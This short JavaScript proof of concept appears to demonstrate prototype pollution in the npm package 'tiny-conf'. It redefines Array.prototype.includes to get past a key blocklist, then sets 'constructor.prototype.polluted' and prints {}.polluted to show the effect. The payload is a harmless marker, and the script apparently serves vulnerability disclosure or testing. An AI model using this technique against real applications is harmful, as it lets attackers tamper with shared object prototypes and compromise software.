Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const tinyConf = require('tiny-conf');
obj = {};
console.log({}.polluted);
tinyConf.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);